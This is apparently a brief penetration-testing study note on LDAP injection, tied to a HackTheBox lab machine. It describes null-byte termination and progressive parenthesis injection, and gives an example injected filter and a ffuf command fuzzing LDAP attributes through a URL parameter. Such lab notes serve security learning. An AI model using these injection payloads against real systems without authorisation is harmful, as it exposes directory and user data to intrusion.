# LDAP Injection

Indicator:

![](../Attachments/Pasted%20image%2020240121231222.png)

## Methodology

End with null byte (`%00`), add `)` progressively to understand the context of the query

https://youtube.com/watch?v=51JQg202csw&t=885

Null byte in ldap is the equivalent to a comment in SQL injection, terminating the statement

Example query

```
(&
	(name=technician)
)
```

Adding the null byte wipes out everything after it, so applying our methodology in this example reveals that we need to add 2 `)` to get expected output and not break the site:

```
(&
	(name=technician))%00
```

We can now fuzz attributes with the following example

```bash
ffuf -w /usr/share/seclists/Fuzzing/LDAP-active-directory-attributes.txt -u 'http://internal.analysis.htb/users/list.php?name=technician)(FUZZ%3d*' -ms 418
```

We match size of 418 cause this is output size matches where the website doesnt break and provides expected output.

Check the following writeup to continue following the logic: [10.129.187.203](../../../Writeups/HackTheBox/0%20Machines/Gen%203/Analysis/10.129.187.203.md)
